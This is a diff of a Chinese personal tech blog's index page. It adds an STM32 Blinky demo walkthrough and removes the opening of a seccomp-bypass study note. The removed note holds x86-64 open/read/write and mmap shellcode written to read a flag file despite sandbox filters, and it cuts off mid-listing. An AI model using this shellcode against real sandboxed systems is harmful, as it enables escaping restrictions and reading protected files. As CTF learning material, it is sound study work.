@@ -150,6 +150,131 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2024/03/29/STM32%E5%AD%A6%E4%B9%A0-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="CoLin">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CoLin's BLOG">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/03/29/STM32%E5%AD%A6%E4%B9%A0-1/" class="post-title-link" itemprop="url">STM32学习 (1)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2024-03-29 12:42:50 / Modified: 18:34:37" itemprop="dateCreated datePublished" datetime="2024-03-29T12:42:50+08:00">2024-03-29</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F/" itemprop="url" rel="index"><span itemprop="name">嵌入式</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>6k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>5 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>实验室研究需要，有关物联网的一些基础还是需要掌握的。于是开始研究实验室买的STM板子，下面通过一个官方demo进行基础内容的学习。</p>
+<h1 id="准备工作"><a class="markdownIt-Anchor" href="#准备工作"></a> 准备工作</h1>
+<p>我使用的开发板是STM32F429 Nucleo-144，MCU为STM32F429ZIT6，属于STM32系列中的高性能MCU。从官网查询信息可知，该MCU一共带有2MB的Flash以及256KB的RAM，核心频率可达180MHz。开发板如下图所示。</p>
+<p><img src="2.jpg" alt="" /></p>
+<p>下面使用Keil进行分析。在官网下载Keil之后安装，UV4目录中有IDE的启动程序UV4.exe以及包管理器PackInstaller.exe。</p>
+<p>打开PackInstaller，左边选择Devices可以找到上面的MCU型号，选择后，右边有Packs和Examples。Packs为开发时可能需要的硬件支持包，包含对各类外设的处理等，Examples则是可以直接烧录到开发板上的demo示例。</p>
+<p>在Pack一栏，我安装了2个Device Specific包，Generic中则安装有：</p>
+<ul>
+<li>ARM::CMSIS</li>
+<li>ARM::CMSIS-Driver</li>
+<li>ARM::CMSIS-DSP</li>
+<li>ARM::CMSIS-NN</li>
+<li>Keil::ARM_Compiler</li>
+<li>Keil::MDK-Middleware</li>
+<li>Keil::MDK-Middleware_Graphics</li>
+</ul>
+<p>如果需要安装其他包，只需直接点击安装即可，包管理器能够自动分析依赖并将某个包所依赖的所有包全部安装。</p>
+<p>在Examples一栏中，前两个就是最简单的亮灯demo。在Install后Copy到某个目录下，使用Keil打开对应的项目文件即可打开demo。</p>
+<p><img src="1.png" alt="" /></p>
+<h1 id="程序分析"><a class="markdownIt-Anchor" href="#程序分析"></a> 程序分析</h1>
+<p>打开Blinky项目，Source Files中只有一个Blinky.c文件，包含这个demo的主要逻辑。</p>
+<p>下面简述这个demo的功能。</p>
+<p>开发板下方左右各有一个按钮，左边蓝色右边黑色（黑色为复位按钮）。在MCU正上方有三个User LED，分别为LD1、LD2、LD3。将开发板上电后（USB应插入上面的USB接口而不是下面，插入后，该接口右边的COM指示灯亮起红灯，User LED右边的PWR指示灯亮起绿灯表示已经供电），在用户无操作时，LD1到LD3依次亮起绿、蓝、红三色灯，每一次点亮持续0.5s，随后熄灭，等待0.5秒后亮起下一个灯，一次循环为3s时间。在循环过程中，如果用户按下蓝色按钮，则循环暂停，正在点亮的灯会持续点亮，如果灯全部熄灭则会持续熄灭。松开按钮后循环继续进行。如果用户按下黑色按钮，循环立即停止并将状态返回至循环开始。黑色按钮不松开时循环暂停，松开后循环重新开始。黑色按钮的优先级高于蓝色按钮，如果两个按钮均按下，则循环重置。</p>
+<h2 id="mainc"><a class="markdownIt-Anchor" href="#mainc"></a> main.c</h2>
+<p>这个项目使用了STM32 CubeMX自动构建项目，它能够为STM32项目提供初始化代码的模板，用户只需要在该模板基础上进行开发即可。不过我们这里暂且不研究这个模板的使用，主要还是以代码为主。</p>
+<p>在main.c中，最重要的就属main函数了。在blinky中，由于只需要完成用户LED的简单点亮操作，因此不需要将进行多余的初始化操作。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  HAL_Init();</span><br><span class="line">  SystemClock_Config();</span><br><span class="line">  SystemCoreClockUpdate();</span><br><span class="line">  MX_GPIO_Init();</span><br><span class="line">  osKernelInitialize();</span><br><span class="line">  osThreadNew(app_main, <span class="literal">NULL</span>, &amp;app_main_attr);</span><br><span class="line">  osKernelStart();</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里基本都是一些与初始化相关的函数。<code>HAL_Init</code>用于初始化外设，下面两个与系统时钟相关，<code>MX_GPIO_Init</code>初始化GPIO引脚，随后<code>osKernelInitialize</code>是操作系统的初始化，这里的操作系统指的是封装了CMSIS-OS的FreeRTOS。CMSIS-RTOS是一层可以封装在不同RTOS上的一个API层，能够为用户提供统一的API，便于编程。这里进行初始化之后调用了<code>osThreadNew</code>函数创建了一个线程，线程执行的函数是<code>app_main</code>，参数为NULL，即没有参数，线程属性为<code>&amp;app_main_attr</code>。线程属性定义了这个线程拥有的栈空间地址及大小，后面在Blinky.c中可以找到。随后<code>osKernelStart</code>即启动OS内核，开始执行用户线程。</p>
+<h2 id="blinkyc"><a class="markdownIt-Anchor" href="#blinkyc"></a> Blinky.c</h2>
+<p>Blinky.c的内容并不多：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"> * Name:    Blinky.c</span></span><br><span class="line"><span class="comment"> * Purpose: LED Flasher</span></span><br><span class="line"><span class="comment"> *----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"> * This file is part of the uVision/ARM development tools.</span></span><br><span class="line"><span class="comment"> * This software may only be used under the terms of a valid, current,</span></span><br><span class="line"><span class="comment"> * end user licence from KEIL for a compatible version of KEIL software</span></span><br><span class="line"><span class="comment"> * development tools. Nothing else gives you the right to use this software.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This software is supplied &quot;AS IS&quot; without warranties of any kind.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2017-2021 Keil - An ARM Company. All rights reserved.</span></span><br><span class="line"><span class="comment"> *----------------------------------------------------------------------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;main.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Board_LED.h&quot;</span>                  <span class="comment">/* ::Board Support:LED */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Board_Buttons.h&quot;</span>              <span class="comment">/* ::Board Support:Buttons */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;RTE_Components.h&quot;</span>             <span class="comment">/* Component selection */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Main stack size must be multiple of 8 Bytes</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> APP_MAIN_STK_SZ (512U)</span></span><br><span class="line"><span class="type">uint64_t</span> app_main_stk[APP_MAIN_STK_SZ / <span class="number">8</span>];</span><br><span class="line"><span class="type">const</span> osThreadAttr_t app_main_attr = &#123;</span><br><span class="line">  .stack_mem  = &amp;app_main_stk[<span class="number">0</span>],</span><br><span class="line">  .stack_size = <span class="keyword">sizeof</span>(app_main_stk)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">volatile</span> <span class="type">uint32_t</span> delay_val = <span class="number">500U</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> osThreadId_t tid_thrLED;         <span class="comment">/* Thread id of thread: LED */</span></span><br><span class="line"><span class="type">static</span> osThreadId_t tid_thrBUT;         <span class="comment">/* Thread id of thread: BUT */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">  thrLED: blink LED</span></span><br><span class="line"><span class="comment"> *----------------------------------------------------------------------------*/</span></span><br><span class="line">__NO_RETURN <span class="type">static</span> <span class="type">void</span> <span class="title function_">thrLED</span><span class="params">(<span class="type">void</span> *argument)</span> &#123;</span><br><span class="line">  <span class="type">uint32_t</span> led_max    = LED_GetCount();</span><br><span class="line">  <span class="type">uint32_t</span> led_num    = <span class="number">0U</span>;</span><br><span class="line"></span><br><span class="line">  (<span class="type">void</span>)argument;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    osThreadFlagsWait(<span class="number">0x0001</span>U, osFlagsWaitAny ,osWaitForever);</span><br><span class="line">    LED_On(led_num);                                            <span class="comment">/* Turn specified LED on */</span></span><br><span class="line">    osThreadFlagsWait(<span class="number">0x0001</span>U, osFlagsWaitAny ,osWaitForever);</span><br><span class="line">    LED_Off(led_num);                                           <span class="comment">/* Turn specified LED off */</span></span><br><span class="line"></span><br><span class="line">    led_num++;                                                  <span class="comment">/* Change LED number */</span></span><br><span class="line">    <span class="keyword">if</span> (led_num &gt;= led_max) &#123;</span><br><span class="line">      led_num = <span class="number">0U</span>;                                             <span class="comment">/* Restart with first LED */</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">  thrBUT: check button state</span></span><br><span class="line"><span class="comment"> *----------------------------------------------------------------------------*/</span></span><br><span class="line">__NO_RETURN <span class="type">static</span> <span class="type">void</span> <span class="title function_">thrBUT</span><span class="params">(<span class="type">void</span> *argument)</span> &#123;</span><br><span class="line">  <span class="type">uint32_t</span> button_msk = (<span class="number">1U</span> &lt;&lt; Buttons_GetCount()) - <span class="number">1U</span>;</span><br><span class="line"></span><br><span class="line">  (<span class="type">void</span>)argument;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    osDelay(delay_val);                                 <span class="comment">/* Wait */</span></span><br><span class="line">    <span class="keyword">while</span> (Buttons_GetState() &amp; (button_msk));          <span class="comment">/* Wait while holding USER button */</span></span><br><span class="line">    osThreadFlagsSet(tid_thrLED, <span class="number">0x0001</span>U);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"> * Application main thread</span></span><br><span class="line"><span class="comment"> *---------------------------------------------------------------------------*/</span></span><br><span class="line">__NO_RETURN <span class="type">void</span> <span class="title function_">app_main</span> <span class="params">(<span class="type">void</span> *argument)</span> &#123;</span><br><span class="line"></span><br><span class="line">  (<span class="type">void</span>)argument;</span><br><span class="line"></span><br><span class="line">  LED_Initialize();                                     <span class="comment">/* initalize LEDs */</span></span><br><span class="line">  Buttons_Initialize();                                 <span class="comment">/* initalize Buttons */</span></span><br><span class="line"></span><br><span class="line">  tid_thrBUT = osThreadNew (thrBUT, <span class="literal">NULL</span>, <span class="literal">NULL</span>);        <span class="comment">/* create BUT thread */</span></span><br><span class="line">  <span class="keyword">if</span> (tid_thrBUT == <span class="literal">NULL</span>) &#123; <span class="comment">/* add error handling */</span> &#125;</span><br><span class="line"></span><br><span class="line">  tid_thrLED = osThreadNew (thrLED, <span class="literal">NULL</span>, <span class="literal">NULL</span>);        <span class="comment">/* create LED thread */</span></span><br><span class="line">  <span class="keyword">if</span> (tid_thrLED == <span class="literal">NULL</span>) &#123; <span class="comment">/* add error handling */</span> &#125;</span><br><span class="line"></span><br><span class="line">  osThreadExit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先看到<code>app_main_attr</code>，这里定义了栈空间以及大小，使用了一个512字节的预分配空间。</p>
+<p>然后是<code>app_main</code>函数，这是线程的入口点。其中首先对LED灯和按钮进行初始化，随后创建了两个子线程，分别执行<code>thrBUT</code>函数和<code>thrLED</code>函数，这两个函数没有指定栈空间，前者控制按钮，后者控制LED灯。</p>
+<p>在<code>thrBUT</code>中有死循环，首先延时500ms，然后循环判断<code>Buttons_GetState() &amp; button_msk</code>的值，为0时退出循环并设置<code>tid_thrLED</code>的标志位为1，其中<code>tid_thrLED</code>为LED线程的线程标志。<code>Buttons_GetState</code>函数会返回一个int值，每一位都代表一个按钮的按下状态。在上面的开发板中只有一个用户按钮（Reset不算），因此该函数的返回值只能为0或1。button_msk的值为1，根据逻辑可以推断出：当按钮按下时，<code>Buttons_GetState</code>的返回值为1，否则为0。当用户没有操作时，内部的while循环总是不循环，即每过0.5s就将LED线程的标志位设置为1。</p>
+<p>在<code>thrLED</code>中也存在一个死循环，首先调用<code>osThreadFlagsWait</code>，当该线程的标志位中有0x1，选项是<code>osFlagsWaitAny</code>，即永远（osWaitForever）等待标志位的最低位被设置为1，当检测到标志位被置位时，立即退出并将标志位复位为0。等待结束后打开LED灯，随后继续等待，等待后关闭LED灯，更换目标LED灯，继续循环。</p>
+<p>整个过程非常清晰，延时的时间长度由<code>thrBUT</code>函数决定，当用户按下按钮时，相当于<code>thrBUT</code>函数阻塞在了内部的<code>while</code>循环中，暂时无法进行下一次置位。两个线程是一个“生产者与消费者”的关系，“消费”的对象就是LED线程的标志位。</p>
+<p>通过上面的示例，我们对CMSIS-RTOS中不同线程之间的交互有了一定的了解。不同线程之间的交互可以通过标志位完成，以控制不同线程之间的逻辑时序。当然很显然仅通过这种方式进行交互还不够，如果需要数据传输则需要另外的方式。</p>
+<h2 id="逆向分析"><a class="markdownIt-Anchor" href="#逆向分析"></a> 逆向分析</h2>
+<p>除了分析C代码之外，简单分析下汇编代码也是有必要的。在Github中可以搜索到一个SVD-loader项目，它是一个Ghidra插件，能够在输入svd文件后自动分析文件中的外设定义，并将外设与对应内存建立联系，大大提高汇编代码及反汇编C代码的可读性。</p>
+<p>每一个市面的MCU都可以找到其对应的svd文件，其中记录有所有外设的信息。最为重要的是所有外设映射的内存地址空间。在程序中，我们只能通过内存和寄存器来进行数据的存取，而无法直接与外设交互。即使是最底层的库，也不能脱离内存玩外设。为了解决这个问题，需要对MCU进行额外的设计，将外设与固定的内存地址建立映射关系。当代码访问到外设映射的内存地址时，MCU可以通过硬件找到外设对应的接口并完成相应操作。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2024/03/03/CVE-2022-0847%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1498,178 +1623,10 @@ io_uring 的实现仅仅使用了三个 syscall：io_uring_setup, io_uring_enter
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/10/31/seccomp%E5%AD%A6%E4%B9%A0-2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="CoLin">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CoLin's BLOG">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/10/31/seccomp%E5%AD%A6%E4%B9%A0-2/" class="post-title-link" itemprop="url">seccomp学习 (2)</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-10-31 09:59:09" itemprop="dateCreated datePublished" datetime="2023-10-31T09:59:09+08:00">2023-10-31</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-11-15 22:06:24" itemprop="dateModified" datetime="2023-11-15T22:06:24+08:00">2023-11-15</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/seccomp-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">seccomp 系列</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>7.9k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>7 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>在本文中，我们来讨论一下近年来针对seccomp的绕过姿势。本文仅讨论x86-64平台。（来货了来货了）</p>
-<h1 id="0x01-execve"><a class="markdownIt-Anchor" href="#0x01-execve"></a> 0x01. execve</h1>
-<p>这个是最为简单的一类题型，不能直接获得shell，但是可以通过open、read、write三个系统调用将flag文件首先保存到内存之中再输出到控制台。</p>
-<p>下面的代码是在内存中不存在&quot;./flag&quot;字符串的情况下绕过execve的orw shellcode：</p>
-<p>函数原型：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">sys_open</span><span class="params">(<span class="type">const</span> <span class="type">char</span> __user *filename, <span class="type">int</span> flags, <span class="type">umode_t</span> mode)</span>;</span><br><span class="line"><span class="type">long</span> <span class="title function_">sys_read</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> fd, <span class="type">char</span> __user *buf, <span class="type">size_t</span> count)</span>;</span><br><span class="line"><span class="type">long</span> <span class="title function_">sys_write</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> fd, <span class="type">const</span> <span class="type">char</span> __user *buf, <span class="type">size_t</span> count)</span>;</span><br></pre></td></tr></table></figure>
-<p>这里对于<code>read</code>和<code>write</code>函数的参数都不需要解释，对于<code>open</code>函数，<code>flags</code>参数表示以何种方式打开文件，0为只读，当<code>open</code>没有创建文件时，<code>mode</code>参数会被忽略，不过最好还是也传入0。</p>
-<p>示例：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x67616c662f2e</span><br><span class="line">push rax</span><br><span class="line">mov rdi, rsp</span><br><span class="line">xor edx, edx</span><br><span class="line">xor esi, esi</span><br><span class="line">push SYS_open</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">push 3</span><br><span class="line">pop rdi</span><br><span class="line">push 0xFF   /* read size */</span><br><span class="line">pop rdx</span><br><span class="line">mov rsi, rsp</span><br><span class="line">push SYS_read</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">push 1</span><br><span class="line">pop rdi</span><br><span class="line">push 0xFF   /* write size */</span><br><span class="line">pop rdx</span><br><span class="line">mov rsi, rsp</span><br><span class="line">push SYS_write</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
-<h1 id="0x02-execve-read"><a class="markdownIt-Anchor" href="#0x02-execve-read"></a> 0x02. execve + read</h1>
-<p>如果题目禁用了<code>read</code>系统调用，但没有禁用<code>open</code>，则可以通过<code>mmap</code>的系统调用将文件内容映射到内存中，再<code>write</code>。</p>
-<p>需要注意的是，对于Linux系统调用，6个参数的传递寄存器分别为<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>r10</code>、<code>r8</code>、<code>r9</code>。与Glibc的传参有所不同。</p>
-<p>函数原型：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">long</span> <span class="title function_">sys_mmap</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> addr, <span class="type">unsigned</span> <span class="type">long</span> len,</span></span><br><span class="line"><span class="params"><span class="type">unsigned</span> <span class="type">long</span> prot, <span class="type">unsigned</span> <span class="type">long</span> flags,</span></span><br><span class="line"><span class="params"><span class="type">unsigned</span> <span class="type">long</span> fd, <span class="type">off_t</span> pgoff)</span>;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x67616c662f2e</span><br><span class="line">push rax</span><br><span class="line">mov rdi, rsp</span><br><span class="line">xor edx, edx</span><br><span class="line">xor esi, esi</span><br><span class="line">push SYS_open</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov rdi, 0x10000</span><br><span class="line">mov rsi, 0x1000</span><br><span class="line">mov rdx, 7</span><br><span class="line">push 0x12</span><br><span class="line">pop r10</span><br><span class="line">push 0x3</span><br><span class="line">pop r8</span><br><span class="line">xor r9, r9</span><br><span class="line">push SYS_mmap</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">push 1</span><br><span class="line">pop rdi</span><br><span class="line">push 0xFF   /* write size */</span><br><span class="line">pop rdx</span><br><span class="line">mov rsi, 0x10000</span><br><span class="line">push SYS_write</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
-<p>注意，内核的<code>mmap</code>函数的<code>flag</code>参数和glibc的不太一样，0x10表示映射文件<code>MAP_FILE</code>，0x2表示私有映射<code>MAP_PRIVATE</code>，0x20表示匿名映射<code>MAP_ANONYMOUS</code>。这里需要使用<code>MAP_FILE | MAP_PRIVATE</code>才能完成映射。</p>
-<p>上述代码可以成功攻击下面的C代码：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/audit.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 